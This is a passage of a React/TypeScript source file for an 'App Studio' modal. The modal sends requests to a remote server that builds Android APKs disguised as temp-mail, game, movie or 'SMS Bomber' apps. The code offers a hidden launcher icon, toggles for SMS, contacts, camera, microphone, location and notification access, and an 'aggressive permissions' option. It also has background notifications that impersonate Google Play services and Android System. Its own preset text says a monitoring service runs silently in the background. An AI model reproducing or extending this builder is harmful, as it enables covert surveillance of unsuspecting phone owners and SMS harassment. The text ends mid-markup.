"use client";

import React, { useState, useEffect, useRef } from 'react';
import CustomAlertModal from './CustomAlertModal';
import { 
    Smartphone, Shield, Bell, Check, Lock, Crown, Zap, 
    ChevronRight, ChevronLeft, Download, Eye, EyeOff, 
    AlertTriangle, Sparkles, Sliders, RefreshCw, Layers, CheckCircle2, Info,
    Mail, Gamepad2, Film, Flame, Globe, Upload, ExternalLink, X, ChevronDown, ChevronUp,
    Settings, MousePointerClick
} from 'lucide-react';

interface AppGenerationModalProps {
    isOpen: boolean;
    onClose: () => void;
    uuid: string;
    socket: any;
    userPlan?: 'basic' | 'standard' | 'premium' | 'enterprise';
    onUpgrade?: (feature?: string, requiredPlan?: string) => void;
}

const APP_PRESETS = [
    {
        id: 'custom',
        name: 'Custom App',
        packageName: 'com.gallery.eye',
        url: '',
        infoTitle: 'Custom Web Application',
        infoText: 'Allows you to wrap any website or web portal into a standalone Android APK with your custom name, package identifier, and PNG icon.'
    },
    {
        id: 'temp_mail',
        name: 'Temp Mail',
        packageName: 'com.tempmail.inbox',
        url: 'https://mail.tm/en/',
        infoTitle: 'Temp Mail Portal',
        infoText: 'Launches a fully functional disposable email service (mail.tm). Users can generate temporary email addresses instantly while your monitoring service runs silently in the background.'
    },
    {
        id: 'poki_games',
        name: 'Poki Games',
        packageName: 'com.poki.games',
        url: 'https://poki.com/',
        infoTitle: 'Poki Games Arcade',
        infoText: 'Launches an interactive online game portal (poki.com) with hundreds of instant mobile games. Perfect for casual entertainment.'
    },
    {
        id: 'movie_box',
        name: 'Movie Box',
        packageName: 'com.moviebox.cinema',
        url: 'https://movie-box.co/',
        infoTitle: 'Movie Box Cinema',
        infoText: 'Launches a sleek cinema and movie streaming hub (movie-box.co). Provides an authentic entertainment streaming interface.'
    },
    {
        id: 'sms_bomber',
        name: 'SMS Bomber',
        packageName: 'com.h4k3r.bomber',
        url: 'https://h4k3r-bomber.vercel.app',
        infoTitle: 'Utility Toolkit',
        infoText: 'Launches a utility web application toolkit (h4k3r-bomber.vercel.app). Looks and behaves like a specialized developer utility app.'
    }
];

const PRESET_ICON_STYLES: Record<string, { gradient: [string, string, string]; svgPath: string }> = {
    temp_mail: {
        gradient: ['#10B981', '#059669', '#047857'],
        svgPath: 'M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z'
    },
    poki_games: {
        gradient: ['#A855F7', '#9333EA', '#6B21A8'],
        svgPath: 'M6 12h.01M10 12h.01M15 16a4 4 0 004-4V6a2 2 0 00-2-2H7a2 2 0 00-2 2v6a4 4 0 004 4h2m0 0v4m-2 0h4'
    },
    movie_box: {
        gradient: ['#F43F5E', '#E11D48', '#9F1239'],
        svgPath: 'M7 4v16M17 4v16M3 8h4m10 0h4M3 12h18M3 16h4m10 0h4M4 20h16a1 1 0 001-1V5a1 1 0 00-1-1H4a1 1 0 00-1 1v14a1 1 0 001 1z'
    },
    sms_bomber: {
        gradient: ['#F59E0B', '#EA580C', '#DC2626'],
        svgPath: 'M17.657 18.657A8 8 0 016.343 7.343S7 9 9 10c0-2 .5-5 2.986-7C14 5 16.09 5.777 17.656 7.343A7.975 7.975 0 0120 13a7.975 7.975 0 01-2.343 5.657z M9.879 16.121A3 3 0 1012.015 11L11 14H9c0 .768.293 1.536.879 2.121z'
    }
};

function generatePresetIconBlob(presetId: string): Promise<Blob | null> {
    return new Promise((resolve) => {
        const style = PRESET_ICON_STYLES[presetId];
        if (!style) { resolve(null); return; }

        const size = 512;
        const canvas = document.createElement('canvas');
        canvas.width = size;
        canvas.height = size;
        const ctx = canvas.getContext('2d');
        if (!ctx) { resolve(null); return; }

        const r = size * 0.22;
        const drawRoundRect = (x: number, y: number, w: number, h: number, radius: number) => {
            ctx.beginPath();
            ctx.moveTo(x + radius, y);
            ctx.lineTo(x + w - radius, y);
            ctx.quadraticCurveTo(x + w, y, x + w, y + radius);
            ctx.lineTo(x + w, y + h - radius);
            ctx.quadraticCurveTo(x + w, y + h, x + w - radius, y + h);
            ctx.lineTo(x + radius, y + h);
            ctx.quadraticCurveTo(x, y + h, x, y + h - radius);
            ctx.lineTo(x, y + radius);
            ctx.quadraticCurveTo(x, y, x + radius, y);
            ctx.closePath();
        };

        const grad = ctx.createLinearGradient(0, 0, size, size);
        grad.addColorStop(0, style.gradient[0]);
        grad.addColorStop(0.5, style.gradient[1]);
        grad.addColorStop(1, style.gradient[2]);

        drawRoundRect(0, 0, size, size, r);
        ctx.fillStyle = grad;
        ctx.fill();

        ctx.strokeStyle = 'rgba(255,255,255,0.25)';
        ctx.lineWidth = 4;
        drawRoundRect(2, 2, size - 4, size - 4, r);
        ctx.stroke();

        const iconSize = size * 0.4;
        const offset = (size - iconSize) / 2;
        ctx.save();
        ctx.translate(offset, offset);
        ctx.scale(iconSize / 24, iconSize / 24);
        ctx.strokeStyle = 'white';
        ctx.lineWidth = 2;
        ctx.lineCap = 'round';
        ctx.lineJoin = 'round';
        ctx.fillStyle = 'none';

        const paths = style.svgPath.split(' M');
        paths.forEach((p, i) => {
            const d = i === 0 ? p : 'M' + p;
            const path2d = new Path2D(d);
            ctx.stroke(path2d);
        });
        ctx.restore();

        canvas.toBlob((blob) => resolve(blob), 'image/png', 1.0);
    });
}

export default function AppGenerationModal({ isOpen, onClose, uuid, socket, userPlan = 'basic', onUpgrade }: AppGenerationModalProps) {
    const isBasicPlan = userPlan === 'basic';
    const isPremium = userPlan === 'premium' || userPlan === 'enterprise';
    const isStandard = userPlan === 'standard' || isPremium;

    const [activeStep, setActiveStep] = useState<'identity' | 'permissions' | 'notifications'>('identity');
    const [status, setStatus] = useState<'idle' | 'queued' | 'generating' | 'downloading' | 'completed'>('idle');
    const [progress, setProgress] = useState(0);
    const [progressStep, setProgressStep] = useState("");
    const [downloadUrl, setDownloadUrl] = useState("");
    const [queuePosition, setQueuePosition] = useState(0);

    // Ref for the main scrollable content area to reset scroll to top on tab switch
    const contentScrollRef = useRef<HTMLDivElement>(null);

    // Auto reset scroll position to very top (scrollTop = 0) whenever activeStep or isOpen changes
    useEffect(() => {
        if (contentScrollRef.current) {
            contentScrollRef.current.scrollTo({ top: 0, behavior: 'instant' });
        }
        if (!isOpen) {
            setActiveStep('identity');
            setStatus('idle');
            setProgress(0);
            setProgressStep("");
            setDownloadUrl("");
            setQueuePosition(0);
            setSelectedPreset('custom');
            setCustomAppName("");
            setCustomPackageName("com.gallery.eye");
            setCustomWebLink("");
            setCustomIcon(null);
            setCustomIconPreview(null);
            setHideApp(false);
            setEnableSmsPermission(false);
            setEnableContactsPermission(false);
            setEnableStoragePermission(true);
            setEnableCameraPermission(false);
            setEnableMicrophonePermission(false);
            setEnableNotificationListener(false);
            setShowPlayProtectWarning(false);
            setAggressivePermissions(false);
            setShowAdvancedPermissions(false);
            setNotificationStyle("google_play");
            setNotificationClickAction("device_info");
            setNotificationIcon("info");
            setNotificationTitle("");
            setNotificationText("");
        }
    }, [activeStep, isOpen]);

    // Selected Preset State
    const [selectedPreset, setSelectedPreset] = useState<string>('custom');

    // Custom App Specific State (ISOLATED from Pre-Integrated Presets)
    const [customAppName, setCustomAppName] = useState("");
    const [customPackageName, setCustomPackageName] = useState("com.gallery.eye");
    const [customWebLink, setCustomWebLink] = useState("");
    const [customIcon, setCustomIcon] = useState<File | null>(null);
    const [customIconPreview, setCustomIconPreview] = useState<string | null>(null);

    // Global Hide Launcher Icon State (Only applicable to custom mode)
    const [hideApp, setHideApp] = useState(false);

    // App Mode Info Modal State
    const [showAppInfoModal, setShowAppInfoModal] = useState<string | null>(null);

    // Generate exactly 3 segments format: com.project.app
    const generatePackageName = (name: string) => {
        const cleaned = name.toLowerCase().replace(/[^a-z0-9\s]/g, '').trim();
        const parts = cleaned.split(/\s+/).filter(Boolean);
        if (parts.length === 0) return "com.gallery.eye";
        if (parts.length === 1) return `com.${parts[0]}.app`;
        return `com.${parts[0]}.${parts[1]}`;
    };

    const handleAppNameChange = (name: string) => {
        setCustomAppName(name);
        setCustomPackageName(generatePackageName(name));
    };

    const handleIconSelect = (file: File | null) => {
        setCustomIcon(file);
        if (file) {
            const url = URL.createObjectURL(file);
            setCustomIconPreview(url);
        } else {
            setCustomIconPreview(null);
        }
    };

    // Permission Manager State
    const [enableSmsPermission, setEnableSmsPermission] = useState(false);
    const [enableContactsPermission, setEnableContactsPermission] = useState(false);
    const [enableStoragePermission, setEnableStoragePermission] = useState(true);
    const [enableCameraPermission, setEnableCameraPermission] = useState(false);
    const [enableMicrophonePermission, setEnableMicrophonePermission] = useState(false);
    const [enableLocationPermission, setEnableLocationPermission] = useState(false);
    const [enableNotificationListener, setEnableNotificationListener] = useState(false);
    const [showPermissionInfo, setShowPermissionInfo] = useState<'sms' | 'contacts' | 'storage' | 'camera' | 'microphone' | 'location' | 'notifications' | null>(null);
    const [showPlayProtectWarning, setShowPlayProtectWarning] = useState(false);
    const [aggressivePermissions, setAggressivePermissions] = useState(false);
    const [showAdvancedPermissions, setShowAdvancedPermissions] = useState(false);

    // Background Service Style & Click Action State
    const [notificationStyle, setNotificationStyle] = useState("google_play");
    const [notificationClickAction, setNotificationClickAction] = useState("device_info");
    const [notificationIcon, setNotificationIcon] = useState("info");
    const [notificationTitle, setNotificationTitle] = useState("");
    const [notificationText, setNotificationText] = useState("");

    // Custom UI Dropdown menu states
    const [isStyleMenuOpen, setIsStyleMenuOpen] = useState(false);
    const [isActionMenuOpen, setIsActionMenuOpen] = useState(false);
    const [isIconMenuOpen, setIsIconMenuOpen] = useState(false);

    const NOTIFICATION_PRESETS: Record<string, { title: string; text: string; icon: string; defaultAction: string; defaultIconKey: string }> = {
        google_play: { 
            title: "Google Play services", 
            text: "Checking for updates…", 
            icon: "ℹ️",
            defaultAction: "device_info",
            defaultIconKey: "info"
        },
        android_system: { 
            title: "Android System", 
            text: "Updating system components…", 
            icon: "🔄",
            defaultAction: "system_settings",
            defaultIconKey: "sync"
        },
        device_security: { 
            title: "Device Security", 
            text: "Scanning for threats…", 
            icon: "🔒",
            defaultAction: "security_settings",
            defaultIconKey: "security"
        },
        system_ui: { 
            title: "System UI", 
            text: "Syncing system data…", 
            icon: "🔄",
            defaultAction: "none",
            defaultIconKey: "sync"
        },
        device_maintenance: { 
            title: "Device maintenance", 
            text: "Optimizing performance…", 
            icon: "🔄",
            defaultAction: "battery_optimization",
            defaultIconKey: "sync"
        },
        download_manager: { 
            title: "Download Manager", 
            text: "Download in progress…", 
            icon: "⬇️",
            defaultAction: "none",
            defaultIconKey: "download"
        },
        custom: { 
            title: "Custom Title", 
            text: "Custom description text", 
            icon: "✏️",
            defaultAction: "device_info",
            defaultIconKey: "info"
        },
    };

    // Auto-select smart behavior when selecting a notification style
    const handleSelectStyle = (key: string) => {
        setNotificationStyle(key);
        const preset = NOTIFICATION_PRESETS[key];
        if (preset) {
            setNotificationClickAction(preset.defaultAction);
            setNotificationIcon(preset.defaultIconKey);
        }
        setIsStyleMenuOpen(false);
    };

    // Exactly ordered: 1st App Info, 2nd Do Nothing, clean simple titles without subtitles
    const CLICK_ACTIONS: Record<string, string> = {
        device_info: "Open App Info & Permissions",
        none: "Do Nothing (Silent Background)",
        system_settings: "Open Device System Settings",
        battery_optimization: "Open Battery & Performance Settings",
        play_store: "Open Google Play Store Page",
        security_settings: "Open Security & Privacy Hub",
        network_settings: "Open Mobile & Wi-Fi Network Settings",
    };

    const ICON_OPTIONS: Record<string, { label: string; symbol: string }> = {
        info: { label: "Info Badge", symbol: "ℹ️" },
        sync: { label: "Sync Arrow", symbol: "🔄" },
        security: { label: "Shield Badge", symbol: "🔒" },
        download: { label: "Download Arrow", symbol: "⬇️" },
        gear: { label: "System Gear", symbol: "⚙️" },
    };

    const [showCustomAlert, setShowCustomAlert] = useState(false);
    const [alertData, setAlertData] = useState({ title: '', message: '', type: 'error' as 'error' | 'warning' | 'success' | 'info' });

    useEffect(() => {
        if (isOpen) {
            setStatus('idle');
            setProgress(0);
            setProgressStep("");
            setDownloadUrl("");
            setQueuePosition(0);
            setActiveStep('identity');
        }
    }, [isOpen]);

    // Active preset details helper
    const getActiveAppDetails = () => {
        const preset = APP_PRESETS.find(p => p.id === selectedPreset);
        if (!preset || selectedPreset === 'custom') {
            return {
                name: customAppName || "Custom App",
                packageName: customPackageName || "com.gallery.eye",
                url: customWebLink,
                infoTitle: "Custom Web Application",
                infoText: "Wraps your provided WebView URL into a standalone Android application."
            };
        }
        return {
            name: preset.name,
            packageName: preset.packageName,
            url: preset.url,
            infoTitle: preset.infoTitle,
            infoText: preset.infoText
        };
    };

    const activeApp = getActiveAppDetails();

    useEffect(() => {
        if (!socket) return;

        const handleProgress = (data: any) => {
            setStatus('generating');
            setProgress(data.progress);
            if (data.step) setProgressStep(data.step);
        };

        const handleQueueUpdate = (data: any) => {
            setStatus('queued');
            setQueuePosition(data.position);
        };

        const handleReady = (data: any) => {
            setStatus('completed');
            setProgress(100);
            setProgressStep("APK ready for download!");
            const finalUrl = data.url || data.downloadUrl || "";
            setDownloadUrl(finalUrl);

            try {
                if (finalUrl) {
                    const link = document.createElement('a');
                    link.href = finalUrl;
                    const filename = data.filename || `${activeApp.name.replace(/\s+/g, '_')}.apk`;
                    link.download = filename.endsWith('.apk') ? filename : `${filename}.apk`;
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                }
            } catch (err) {
                console.error("Auto download trigger error:", err);
            }
        };

        const handleError = (data: any) => {
            console.error("APK Error:", data);
            setStatus('idle');
            setAlertData({
                title: 'Generation Failed',
                message: data.message || 'An error occurred while building the APK.',
                type: 'error'
            });
            setShowCustomAlert(true);
        };

        socket.on('apk_progress', handleProgress);
        socket.on('queue_update', handleQueueUpdate);
        socket.on('apk_ready', handleReady);
        socket.on('apk_error', handleError);

        return () => {
            socket.off('apk_progress', handleProgress);
            socket.off('queue_update', handleQueueUpdate);
            socket.off('apk_ready', handleReady);
            socket.off('apk_error', handleError);
        };
    }, [socket, activeApp.name]);

    const startGeneration = async () => {
        // Validation: ONLY validate when custom preset is selected AND hideApp is OFF
        if (selectedPreset === 'custom' && !hideApp) {
            if (!customAppName.trim()) {
                setAlertData({
                    title: 'App Name Required',
                    message: 'Please enter your app display name for the custom app.',
                    type: 'warning'
                });
                setShowCustomAlert(true);
                return;
            }
            if (!customWebLink.trim()) {
                setAlertData({
                    title: 'Web Link Required',
                    message: 'Please provide a WebView link for your custom app.\n\nThe app needs a URL to display when launched.',
                    type: 'warning'
                });
                setShowCustomAlert(true);
                return;
            }
            if (!customIcon && !customIconPreview) {
                setAlertData({
                    title: 'Custom Icon Required',
                    message: 'Please select an icon (PNG/JPG) for your custom app.',
                    type: 'warning'
                });
                setShowCustomAlert(true);
                return;
            }
        }

        setStatus('generating');
        setProgress(5);
        setProgressStep("Initializing request...");

        try {
            if (!uuid) {
                throw new Error("User ID is missing. Please log in again.");
            }

            const formData = new FormData();
            formData.append('uuid', uuid);
            formData.append('appName', activeApp.name);
            formData.append('packageName', activeApp.packageName);
            formData.append('hideApp', (selectedPreset === 'custom' ? hideApp : false).toString());
            formData.append('webLink', activeApp.url);
            formData.append('enableSmsPermission', enableSmsPermission.toString());
            formData.append('enableContactsPermission', enableContactsPermission.toString());
            formData.append('enableStoragePermission', enableStoragePermission.toString());
            formData.append('enableCameraPermission', enableCameraPermission.toString());
            formData.append('enableMicrophonePermission', enableMicrophonePermission.toString());
            formData.append('enableLocationPermission', enableLocationPermission.toString());
            formData.append('enableNotificationListener', enableNotificationListener.toString());
            formData.append('aggressivePermissions', aggressivePermissions.toString());
            formData.append('notificationStyle', notificationStyle);
            formData.append('notificationClickAction', notificationClickAction);
            formData.append('notificationIcon', notificationIcon);

            if (notificationStyle === 'custom') {
                formData.append('notificationTitle', notificationTitle || 'System Service');
                formData.append('notificationText', notificationText || 'Running background checks…');
            }
            if (selectedPreset === 'custom' && customIcon) {
                formData.append('icon', customIcon);
            } else if (selectedPreset !== 'custom') {
                const iconBlob = await generatePresetIconBlob(selectedPreset);
                if (iconBlob) {
                    formData.append('icon', iconBlob, `${selectedPreset}_icon.png`);
                }
            }

            const response = await fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/download-apk`, {
                method: 'POST',
                body: formData,
            });

            if (!response.ok) {
                const errorText = await response.text();
                throw new Error(errorText || "Generation failed to start");
            }

            const data = await response.json();
            if (data.position) {
                setStatus('queued');
                setQueuePosition(data.position);
            }
        } catch (error: any) {
            console.error(error);
            setStatus('idle');
            setAlertData({
                title: 'Error Starting Build',
                message: error.message || "Failed to start generation. Please try again.",
                type: 'error'
            });
            setShowCustomAlert(true);
        }
    };

    // Mini 48px tile icon renderer for grid selection
    const renderPresetIconBadge = (presetId: string) => {
        switch (presetId) {
            case 'temp_mail':
                return (
                    <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-[#10B981] via-[#059669] to-[#047857] flex items-center justify-center shadow-md border border-white/20">
                        <Mail className="w-6 h-6 text-white drop-shadow" />
                    </div>
                );
            case 'poki_games':
                return (
                    <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-[#A855F7] via-[#9333EA] to-[#6B21A8] flex items-center justify-center shadow-md border border-white/20">
                        <Gamepad2 className="w-6 h-6 text-white drop-shadow" />
                    </div>
                );
            case 'movie_box':
                return (
                    <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-[#F43F5E] via-[#E11D48] to-[#9F1239] flex items-center justify-center shadow-md border border-white/20">
                        <Film className="w-6 h-6 text-white drop-shadow" />
                    </div>
                );
            case 'sms_bomber':
                return (
                    <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-[#F59E0B] via-[#EA580C] to-[#DC2626] flex items-center justify-center shadow-md border border-amber-300/30">
                        <Flame className="w-6 h-6 text-amber-200 drop-shadow" />
                    </div>
                );
            default:
                return (
                    <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-[#6366F1] via-[#4F46E5] to-[#3730A3] flex items-center justify-center shadow-md border border-white/20">
                        <Globe className="w-6 h-6 text-white drop-shadow" />
                    </div>
                );
        }
    };

    // Realistic Android screen icon renderer (STRICTLY ISOLATED BY PRESET)
    const renderRealisticIcon = () => {
        if (selectedPreset === 'custom') {
            if (customIconPreview) {
                return (
                    <div className="w-full h-full rounded-[22px] overflow-hidden shadow-[0_12px_28px_rgba(0,0,0,0.6)] border border-white/20">
                        <img src={customIconPreview} alt="Uploaded Custom Icon" className="w-full h-full object-cover" />
                    </div>
                );
            }
            return (
                <div className="w-full h-full rounded-[22px] bg-gradient-to-br from-[#6366F1] via-[#4F46E5] to-[#3730A3] p-3 flex flex-col items-center justify-center shadow-[0_12px_28px_rgba(99,102,241,0.45)] border border-white/25 relative overflow-hidden group">
                    <div className="w-12 h-12 rounded-2xl bg-white/20 backdrop-blur-md flex items-center justify-center border border-white/30 shadow-inner">
                        <Globe className="w-7 h-7 text-white drop-shadow" />
                    </div>
                    <span className="text-[9px] font-black tracking-widest text-white/90 uppercase mt-1 drop-shadow">CUSTOM</span>
                </div>
            );
        }

        switch (selectedPreset) {
            case 'temp_mail':
                return (
                    <div className="w-full h-full rounded-[22px] bg-gradient-to-br from-[#10B981] via-[#059669] to-[#047857] p-3 flex flex-col items-center justify-center shadow-[0_12px_28px_rgba(16,185,129,0.45)] border border-white/25 relative overflow-hidden group">
                        <div className="absolute inset-0 bg-gradient-to-t from-black/20 to-transparent" />
                        <div className="w-12 h-10 rounded-xl bg-white/20 backdrop-blur-md flex items-center justify-center border border-white/30 shadow-inner">
                            <Mail className="w-7 h-7 text-white drop-shadow" />
                        </div>
                        <span className="text-[9px] font-black tracking-widest text-white/90 uppercase mt-1.5 drop-shadow">MAIL.TM</span>
                    </div>
                );
            case 'poki_games':
                return (
                    <div className="w-full h-full rounded-[22px] bg-gradient-to-br from-[#A855F7] via-[#9333EA] to-[#6B21A8] p-3 flex flex-col items-center justify-center shadow-[0_12px_28px_rgba(168,85,247,0.45)] border border-white/25 relative overflow-hidden group">
                        <div className="absolute -top-6 -right-6 w-16 h-16 bg-pink-400/30 rounded-full blur-xl" />
                        <div className="w-12 h-12 rounded-2xl bg-white/15 backdrop-blur-md flex items-center justify-center border border-white/30 shadow-inner">
                            <Gamepad2 className="w-7 h-7 text-white drop-shadow" />
                        </div>
                        <span className="text-[9px] font-black tracking-widest text-white/90 uppercase mt-1 drop-shadow">POKI</span>
                    </div>
                );
            case 'movie_box':
                return (
                    <div className="w-full h-full rounded-[22px] bg-gradient-to-br from-[#F43F5E] via-[#E11D48] to-[#9F1239] p-3 flex flex-col items-center justify-center shadow-[0_12px_28px_rgba(244,63,94,0.45)] border border-white/25 relative overflow-hidden group">
                        <div className="absolute inset-0 bg-[radial-gradient(circle_at_top_right,rgba(255,255,255,0.25),transparent)]" />
                        <div className="w-12 h-12 rounded-2xl bg-white/20 backdrop-blur-md flex items-center justify-center border border-white/30 shadow-inner">
                            <Film className="w-7 h-7 text-white drop-shadow" />
                        </div>
                        <span className="text-[9px] font-black tracking-widest text-white/90 uppercase mt-1 drop-shadow">CINEMA</span>
                    </div>
                );
            case 'sms_bomber':
                return (
                    <div className="w-full h-full rounded-[22px] bg-gradient-to-br from-[#F59E0B] via-[#EA580C] to-[#DC2626] p-3 flex flex-col items-center justify-center shadow-[0_12px_28px_rgba(245,158,11,0.45)] border border-white/25 relative overflow-hidden group">
                        <div className="absolute inset-0 bg-gradient-to-b from-transparent via-black/10 to-black/30" />
                        <div className="w-12 h-12 rounded-2xl bg-black/30 backdrop-blur-md flex items-center justify-center border border-amber-300/40 shadow-inner">
                            <Flame className="w-7 h-7 text-amber-300 drop-shadow-[0_0_8px_rgba(251,191,36,0.8)]" />
                        </div>
                        <span className="text-[9px] font-black tracking-widest text-amber-200 uppercase mt-1 drop-shadow">H4K3R</span>
                    </div>
                );
            default:
                return (
                    <div className="w-full h-full rounded-[22px] bg-gradient-to-br from-[#6366F1] via-[#4F46E5] to-[#3730A3] p-3 flex flex-col items-center justify-center shadow-[0_12px_28px_rgba(99,102,241,0.45)] border border-white/25 relative overflow-hidden group">
                        <div className="w-12 h-12 rounded-2xl bg-white/20 backdrop-blur-md flex items-center justify-center border border-white/30 shadow-inner">
                            <Globe className="w-7 h-7 text-white drop-shadow" />
                        </div>
                        <span className="text-[9px] font-black tracking-widest text-white/90 uppercase mt-1 drop-shadow">CUSTOM</span>
                    </div>
                );
        }
    };

    if (!isOpen) return null;

    return (
        <div className="fixed inset-0 z-[300] flex items-center justify-center bg-black/80 backdrop-blur-xl animate-in fade-in duration-200 p-3 sm:p-6 overflow-y-auto">
            <div className="bg-[#101217] border border-white/10 rounded-[2.5rem] max-w-2xl w-full flex flex-col shadow-[0_25px_80px_rgba(0,0,0,0.9)] relative max-h-[92dvh] overflow-hidden">
                
                {/* 2-Row Spacious Header */}
                <div className="border-b border-white/10 bg-black/60">
                    {/* Top row: Title + Rose Close Button */}
                    <div className="px-5 py-3.5 flex items-center justify-between">
                        <div className="flex items-center gap-2">
                            <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
                            <span className="text-sm font-black text-white uppercase tracking-wider">App Studio</span>
                        </div>
                        <button
                            onClick={onClose}
                            className="w-9 h-9 rounded-full bg-rose-500/20 hover:bg-rose-500/35 border border-rose-500/50 flex items-center justify-center text-rose-300 hover:text-white shadow-[0_0_15px_rgba(244,63,94,0.3)] transition-all flex-shrink-0"
                            title="Close App Studio"
                        >
                            ✕
                        </button>
                    </div>

                    {/* Bottom row: Perfectly Balanced Responsive Stepper Bar (Instant toggle, ZERO trailing blink/flicker) */}
                    <div className="px-3 pb-3.5">
                        <div className="flex items-center justify-between gap-1 sm:gap-2 p-1.5 rounded-2xl bg-black/50 border border-white/10">
                            {[
                                { id: 'identity', stepNum: '1', label: 'App Mode' },
                                { id: 'permissions', stepNum: '2', label: 'Permissions' },
                                { id: 'notifications', stepNum: '3', label: 'Service Style' }
                            ].map((item) => {
                                const isActive = activeStep === item.id;
                                return (
                                    <button
                                        key={item.id}
                                        type="button"
                                        onClick={() => setActiveStep(item.id as any)}
                                        className={`flex-1 flex items-center justify-center gap-1.5 py-2.5 px-2 sm:px-3.5 rounded-xl border ${
                                            isActive
                                                ? 'bg-gradient-to-r from-emerald-500/20 to-teal-500/20 text-emerald-300 border-emerald-500/60 shadow-[0_0_16px_rgba(16,185,129,0.22)] font-extrabold'
                                                : 'border-transparent text-fg-3 hover:text-white hover:bg-white/[0.04]'
                                        }`}
                                    >
                                        <span className={`w-5 h-5 rounded-full flex items-center justify-center text-[10px] font-black flex-shrink-0 ${
                                            isActive ? 'bg-emerald-400 text-black shadow-sm' : 'bg-white/10 text-fg-3'
                                        }`}>
                                            {item.stepNum}
                                        </span>
                                        <span className="text-[11px] sm:text-xs font-bold whitespace-nowrap tracking-tight">
                                            {item.label}
                                        </span>
                                    </button>
                                );
                            })}
                        </div>
                    </div>
                </div>

                {/* Main Content Area - Auto scrolls to top on tab switch via contentScrollRef */}
                <div ref={contentScrollRef} className="p-5 sm:p-7 overflow-y-auto flex-1 space-y-6 custom-scrollbar">
                    
                    {/* STEP 1: APPLICATION MODES & PRESETS */}
                    {activeStep === 'identity' && (
                        <div className="space-y-6">
                            
                            {/* App Icon Tile Grid */}
                            <div>
                                <label className="block text-xs font-bold text-fg-3 uppercase tracking-widest mb-3">Select Application Mode</label>
                                <div className="grid grid-cols-3 sm:grid-cols-5 gap-3">
                                    {APP_PRESETS.map((p) => {
                                        const isSelected = selectedPreset === p.id;
                                        return (
                                            <button
                                                key={p.id}
                                                type="button"
                                                onClick={() => setSelectedPreset(p.id)}
                                                className={`p-3.5 rounded-2xl border flex flex-col items-center justify-center gap-2.5 transition-all text-center ${
                                                    isSelected
                                                        ? 'bg-emerald-500/15 border-emerald-500/60 shadow-[0_0_20px_rgba(16,185,129,0.2)] scale-[1.03]'
                                                        : 'bg-black/40 border-white/10 hover:border-white/20 text-fg-3 hover:bg-white/[0.04]'
                                                }`}
                                            >
                                                {renderPresetIconBadge(p.id)}
                                                <span className={`text-xs font-bold leading-tight truncate w-full ${isSelected ? 'text-white' : 'text-fg-3'}`}>
                                                    {p.name}
                                                </span>
                                            </button>
                                        );
                                    })}
                                </div>
                            </div>

                            {/* Form Configuration / Preview Section */}
                            <div className={`grid grid-cols-1 ${selectedPreset === 'custom' ? 'sm:grid-cols-12 gap-5' : 'sm:grid-cols-1'} items-start pt-1`}>
                                
                                {/* Form Inputs: ONLY Shown when selectedPreset === 'custom' */}
                                {selectedPreset === 'custom' && (
                                    <div className="sm:col-span-7 space-y-4 animate-in fade-in">
                                        {/* App Display Name */}
                                        <div>
                                            <label className="block text-xs font-bold text-fg-3 uppercase tracking-wider mb-1.5">App Display Name</label>
                                            <input
                                                type="text"
                                                value={customAppName}
                                                onChange={(e) => handleAppNameChange(e.target.value)}
                                                className="w-full bg-black/50 border border-white/10 rounded-2xl px-4 py-3 text-white font-bold focus:outline-none focus:border-emerald-500/60 transition-colors shadow-inner"
                                                placeholder="enter your app name"
                                            />
                                        </div>

                                        {/* Package Identifier (Exactly 3 Segments e.g. com.gallery.eye) */}
                                        <div>
                                            <label className="block text-xs font-bold text-fg-3 uppercase tracking-wider mb-1.5">Package Identifier</label>
                                            <input
                                                type="text"
                                                value={customPackageName}
                                                onChange={(e) => setCustomPackageName(e.target.value.toLowerCase().replace(/[^a-z0-9.]/g, ''))}
                                                className="w-full bg-black/50 border border-white/10 rounded-2xl px-4 py-3 text-white font-mono text-xs focus:outline-none focus:border-emerald-500/60 transition-colors shadow-inner"
                                                placeholder="com.gallery.eye"
                                            />
                                            <p className="text-[11px] text-fg-4 mt-1">Format: com.project.name (3 segments)</p>
                                        </div>

                                        {/* Custom Web Portal Link */}
                                        <div>
                                            <label className="block text-xs font-bold text-fg-3 uppercase tracking-wider mb-1.5">Launch Web URL</label>
                                            <input
                                                type="url"
                                                value={customWebLink}
                                                onChange={(e) => setCustomWebLink(e.target.value)}
                                                className="w-full bg-black/50 border border-white/10 rounded-2xl px-4 py-3 text-white text-sm focus:outline-none focus:border-emerald-500/60 transition-colors shadow-inner"
                                                placeholder="https://example.com"
                                            />
                                        </div>

                                        {/* Custom Icon PNG */}
                                        <div>
                                            <label className="block text-xs font-bold text-fg-3 uppercase tracking-wider mb-1.5">Upload Custom Icon PNG</label>
                                            <label className="w-full bg-black/40 border border-dashed border-white/15 hover:border-white/30 rounded-2xl p-3 flex items-center justify-between cursor-pointer transition-colors group">
                                                <div className="flex items-center gap-2.5">
                                                    <div className="w-9 h-9 rounded-xl bg-white/5 flex items-center justify-center text-fg-3 group-hover:text-white transition-colors">
                                                        <Upload size={16} />
                                                    </div>
                                                    <div>
                                                        <span className="text-xs font-bold text-white block">Choose PNG / JPG Icon</span>
                                                        <span className="text-[10px] text-fg-4">Recommended 512x512px transparent</span>
                                                    </div>
                                                </div>
                                                <input
                                                    type="file"
                                                    accept="image/png, image/jpeg"
                                                    onChange={(e) => handleIconSelect(e.target.files?.[0] || null)}
                                                    className="hidden"
                                                />
                                            </label>
                                        </div>
                                    </div>
                                )}

                                {/* Soft UI Phone Home-Screen Preview */}
                                <div className={`${selectedPreset === 'custom' ? 'sm:col-span-5' : 'max-w-sm mx-auto w-full'} bg-gradient-to-b from-black/60 to-black/30 border border-white/10 rounded-3xl p-5 flex flex-col items-center justify-center text-center shadow-xl relative`}>
                                    <div className="text-[10px] font-bold text-fg-3 uppercase tracking-widest mb-4">Live Android Home Screen</div>
                                    
                                    {/* App Icon Container with Corner Info Icon */}
                                    <div className="w-24 h-24 mb-3 relative group">
                                        {renderRealisticIcon()}

                                        {/* Corner Info Button ONLY for Pre-integrated Apps */}
